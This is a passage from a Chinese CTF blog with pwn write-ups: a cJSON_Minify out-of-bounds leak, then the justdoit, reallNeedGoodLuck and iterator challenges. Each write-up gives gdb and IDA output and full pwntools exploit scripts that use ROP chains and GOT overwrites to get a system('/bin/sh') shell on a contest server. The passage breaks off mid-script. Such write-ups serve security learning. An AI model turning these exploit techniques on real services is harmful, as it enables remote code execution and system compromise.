class="line">              <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">                ++str_a1;</span><br><span class="line">              str_a1 += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( *str_a1 &amp;&amp; *str_a1 != <span class="string">'\n'</span> )</span><br><span class="line">              ++str_a1;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = last;</span><br><span class="line">    *last = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后输出处理后，第二次输入的字符串的前8位。</p><h2 id="漏洞点与利用"><a href="#漏洞点与利用" class="headerlink" title="漏洞点与利用"></a>漏洞点与利用</h2><p>这里在<code>cJSON_Minify</code>函数中有个两个问题，第一个是越界(即<code>cJSON_Minify</code>第89-92行）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> ( *str_a1 &amp;&amp; (*str_a1 != <span class="string">'*'</span> || str_a1[<span class="number">1</span>] != <span class="string">'/'</span>) )</span><br><span class="line">    ++str_a1;</span><br><span class="line">  str_a1 += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当字符串中有<code>\*</code>开头时，会不断遍历剩下字符直到遇到<code>\x00</code>或<code>*/</code>。但这里没有写仔细，如果遇到<code>*/</code>最后<code>str_a1 += 2;</code>是合理的但是遇到的是<code>\x00</code></p><p>就有越界的风险。</p><p>第二个问题是在对一般字符处理时（即<code>cJSON_Minify</code>第81-84行）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v14 &#x3D; str_a1++;</span><br><span class="line">v15 &#x3D; *v14;</span><br><span class="line">v16 &#x3D; last++;</span><br><span class="line">*v16 &#x3D; v15;</span><br></pre></td></tr></table></figure><p>在对正常字符处理时，<code>cJSON_Minify</code>函数<code>str_a1</code>处的数据放入<code>last</code>处，在正常情况下，str_a1的位置和last的位置是一样的。但是如果触发了问题一中的越界，那么<code>str_a1</code>指向我们字符串为<code>\x00</code>的位置还要+1的地方,而last处的还指向字符串的’/‘字符的位置。达成了，越界写。</p><p>就这个题目而言，如果我们输入的字符分别为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">”xxxxxxxx/*oooo“ <span class="comment">#第一次的字符串</span></span><br><span class="line"></span><br><span class="line">”<span class="number">1234567890</span>qqqq” <span class="comment">#第二次字符串，v6</span></span><br></pre></td></tr></table></figure><p>那么，在处理前栈上的数据为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx&#x2F;*oooo&quot;</span><br><span class="line">0x7ffc7f8d67bf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67c0: &quot;1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>在处理后，第一次字符串中的<code>/*oooo\x00</code>被替换成了第二个字符串中同等长度的字符<code>12345678</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffc7f8d67b0: &quot;xxxxxxxx1234567890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67c7: &quot;890qqqq&quot;</span><br><span class="line">0x7ffc7f8d67cf: &quot;&quot;</span><br><span class="line">0x7ffc7f8d67d0: &quot;this_is_data_in_server&quot;</span><br></pre></td></tr></table></figure><p>同时，若在第二次字符中还有 <code>/*</code>则将会在再次触发上面的步骤。</p><p>经过测试后发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf： xxxxxxxxxxxx&#x2F;*   v6:1111&#x2F;*qqqqqqqq</span><br><span class="line"></span><br><span class="line">buf： xxxxx&#x2F;*1111111    v6: &#x2F;*qqqqqqqqqqqq</span><br></pre></td></tr></table></figure><p>正好4次输入正好可以泄露出flag。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/29 09:59:15</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./cJSON_PWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">''</span>,]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> Nonex</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">x=<span class="string">'s/*aaaaaaa'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=<span class="string">'/*'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'1111/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">x=<span class="string">'/*1111111'</span>.rjust(<span class="number">0xe</span>,<span class="string">'x'</span>)</span><br><span class="line">y=<span class="string">'/*'</span>.ljust(<span class="number">0xe</span>,<span class="string">'q'</span>)</span><br><span class="line">print(x+y)</span><br><span class="line">p.send(x+y)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="后记-信息收集"><a href="#后记-信息收集" class="headerlink" title="后记-信息收集"></a>后记-信息收集</h2><p>在查阅这个题资料时发现这原理是一个信息收集题，orw…</p><p>搜索程序的文件可以看一个github项目：</p><p><img src="image-20211231165136223.png" alt="image-20211231165136223"></p><p>这里就一个看到一个security报告。</p><p><img src="image-20211231165647957.png" alt="image-20211231165647957"></p><p>这里就提到<code>/*</code>的报告，链接<a href="https://github.com/DaveGamble/cJSON/issues/338" target="_blank" rel="noopener">https://github.com/DaveGamble/cJSON/issues/338</a></p><p><img src="image-20211231170448565.png" alt="image-20211231170448565"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个签到都这么有意思，其他题一定也都很有趣吧….</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东软2021CTF--PWN--wp</title>
      <link href="/2021/12/04/%E4%B8%9C%E8%BD%AF/"/>
      <url>/2021/12/04/%E4%B8%9C%E8%BD%AF/</url>
      
        <content type="html"><![CDATA[<p>第一次吃到东软的瓜，虽然是大连东软的(老NSUer气抖冷)……<a id="more"></a></p><h3 id="justdoit"><a href="#justdoit" class="headerlink" title="justdoit"></a>justdoit</h3><p>经过动态gdb发现，如果我们通过栈溢出劫持<code>main</code>重新运行，那么第二次输入的将放在第一次输入数据的上方。这样通过两次合理输入构造，我们可控的输入空间扩大。就可以在泄露出libc的真实地址的同时，然后<code>mian</code>程序流中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7fffbfe39330 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7fffbfe39338 —▸ 0x404028 (read@got.plt) —▸ 0x7f7373e188b0 (read) ◂— mov    eax, dword ptr fs:[0x18]</span><br><span class="line">02:0010│     0x7fffbfe39340 —▸ 0x401030 (puts@plt) ◂— jmp    qword ptr [rip + 0x2fe2]</span><br><span class="line">03:0018│     0x7fffbfe39348 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">04:0020│     0x7fffbfe39350 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7fffbfe39358 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">06:0030│     0x7fffbfe39360 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">07:0038│     0x7fffbfe39368 ◂— 0x0</span><br></pre></td></tr></table></figure><p>再通过LibcSearcher 找到system 和 /bin/sh 的真实地址，然后构造rop链get shell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffc354e6078 —▸ 0x4012b3 (__libc_csu_init+99) ◂— pop    rdi</span><br><span class="line">01:0008│     0x7ffc354e6080 —▸ 0x7f6ad64b269b ◂— 0x68732f6e69622f &#x2F;* &#39;&#x2F;bin&#x2F;sh&#39; *&#x2F;</span><br><span class="line">02:0010│     0x7ffc354e6088 —▸ 0x7f6ad6372e10 (system) ◂— test   rdi, rdi</span><br><span class="line">03:0018│     0x7ffc354e6090 ◂— 0x0</span><br><span class="line">04:0020│     0x7ffc354e6098 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">05:0028│     0x7ffc354e60a0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br><span class="line">06:0030│     0x7ffc354e60a8 —▸ 0x4011d5 (main) ◂— push   rbp</span><br><span class="line">07:0038│     0x7ffc354e60b0 —▸ 0x40123e (main+105) ◂— add    rbp, rax</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 17:36:49</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./justdoit'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65004</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:        0x00007f459ba23210      0x00007f459ba04dc0</span></span><br><span class="line"><span class="comment">#0x404028 &lt;read@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#main  0x4011d5</span></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line"><span class="comment">#0x40123e</span></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(<span class="number">0x4011d5</span>)+p64(<span class="number">0x4011d5</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Hi there! What is your name?'</span>)</span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(e.got[<span class="string">'read'</span>])+p64(e.sym[<span class="string">'puts'</span>]))</span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">x=finder(<span class="string">'read'</span>,addr)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x00000000004012b3</span>)+p64(x.dump(<span class="string">'str_bin_sh'</span>))+p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'-40'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="reallNeedGoodLuck"><a href="#reallNeedGoodLuck" class="headerlink" title="reallNeedGoodLuck"></a>reallNeedGoodLuck</h3><p>分析程序流发现，在进行任意地址覆盖写时。除了<code>exit</code>函数外的libc函数，都已经延迟绑定完毕。而我们只能覆盖4个字节，单纯操作难以直接修改任何libc为<code>system</code>，同时发现程序流有<code>exit</code>函数来控制结束 ,所以只能先覆盖exit函数来控制程序流。继续审计程序代码发现，在我们通过劫持 <code>exit</code> 函数再次进入程序流时   <code>init</code>函数作用可有可无，同时  <code>init</code>函数中的<code>setvbuf</code>函数不仅got地址可以被我们劫持,第一个参数<code>stdin</code>也受我们控制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0000000000401166                 public init</span><br><span class="line">.text:0000000000401166 init            proc near               ; CODE XREF: main+1C↓p</span><br><span class="line">.text:0000000000401166 ; __unwind &#123;</span><br><span class="line">.text:0000000000401166                 push    rbp</span><br><span class="line">.text:0000000000401167                 mov     rbp, rsp</span><br><span class="line">.text:000000000040116A                 mov     rax, cs:stdin@GLIBC_2_2_5  &#x2F;&#x2F; puts.got</span><br><span class="line">.text:0000000000401171                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401176                 mov     edx, 2          ; modes</span><br><span class="line">.text:000000000040117B                 mov     esi, 0          ; buf</span><br><span class="line">.text:0000000000401180                 mov     rdi, rax        ; stream</span><br><span class="line">.text:0000000000401183                 call    _setvbuf&#x2F;&#x2F; puts</span><br><span class="line">.text:0000000000401188                 mov     rax, cs:__bss_start</span><br><span class="line">.text:000000000040118F                 mov     ecx, 0          ; n</span><br><span class="line">.text:0000000000401194                 mov     edx, 2          ; modes</span><br><span class="line">.text:0000000000401199                 mov     esi, 0          ; buf</span><br><span class="line">.text:000000000040119E                 mov     rdi, rax        ; stream</span><br><span class="line">.text:00000000004011A1                 call    _setvbuf</span><br><span class="line">.text:00000000004011A6                 nop</span><br><span class="line">.text:00000000004011A7                 pop     rbp</span><br><span class="line">.text:00000000004011A8                 retn</span><br><span class="line">.text:00000000004011A8 ; &#125; &#x2F;&#x2F; starts at 401166</span><br><span class="line">.text:00000000004011A8 init            endp</span><br></pre></td></tr></table></figure><p>因此我们先劫持<code>exit</code>让其跳转到执行完<code>init</code>函数处即<code>0x0000000004011CA</code>位置。然后修改<code>setvbuf</code>函数为<code>puts</code>函数。再将<code>stdin</code>地址改<code>puts</code> got 地址与劫持<code>exit</code>函数为完整<code>mian</code>函数来泄露出真实地址。(其实直接<code>stdin</code>,就可以泄露出，但本地环境中常泄露出截断符)</p><p>然后再将<code>atoi</code>函数劫持为<code>system</code>，再传入<code>/bin/sh\x00</code>即可以getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/04 14:33:30</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> * <span class="comment">#https://github.com/lexsd6/LibcSearcher_plus</span></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./reallNeedGoodLuck.1'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65003</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"><span class="comment">#0x404018 &lt;puts@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404038 &lt;exit@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x404030 &lt;atoi@got.plt&gt;:</span></span><br><span class="line"><span class="comment">#0x00000000004012b3 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00404100</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,date)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'good'</span>)</span><br><span class="line">    p.send(p32(date))</span><br><span class="line">    p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">    p.sendline(str(addr))</span><br><span class="line"></span><br><span class="line">main_addr_a=<span class="number">0X0000000004011CA</span></span><br><span class="line">main_addr=<span class="number">0x0000000004011A9</span></span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr_a)</span><br><span class="line"><span class="comment">#00000000004011D4 </span></span><br><span class="line"><span class="comment">#0x00000000004012b3</span></span><br><span class="line"><span class="comment">#exit   0x404038</span></span><br><span class="line"></span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>],e.got[<span class="string">'puts'</span>])</span><br><span class="line">edit(e.sym[<span class="string">'stdin'</span>]+<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>]),(e.plt[<span class="string">'puts'</span>]))</span><br><span class="line">edit((e.got[<span class="string">'setvbuf'</span>] + <span class="number">4</span>),(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line">edit(e.got[<span class="string">'exit'</span>],main_addr)</span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">p.recvline()</span><br><span class="line">addr=u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'puts'</span>,addr)</span><br><span class="line"><span class="comment">#edit(e.got['exit'],main_addr_a)</span></span><br><span class="line"></span><br><span class="line">p.send(p32(main_addr_a))</span><br><span class="line">p.recvuntil(<span class="string">'luck! '</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x404038</span>))</span><br><span class="line"></span><br><span class="line">system_addr=x.dump(<span class="string">'system'</span>)</span><br><span class="line">log.info(hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(e.got[<span class="string">'atoi'</span>],u32(p64(system_addr)[:<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="string">'/bin/sh\x00'</span>,main_addr_a)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="iterator"><a href="#iterator" class="headerlink" title="iterator"></a>iterator</h3><p>在overwrite功能在修改变量大于原数量时，修改数据会越界。把下个chuck数据修改，加个PIE未开，可以劫持got表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2021/12/05 09:53:58</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./iterator'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch=e.arch</span><br><span class="line">ip_port=[<span class="string">'47.106.172.144'</span>,<span class="number">65001</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> : gdb.attach(p) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   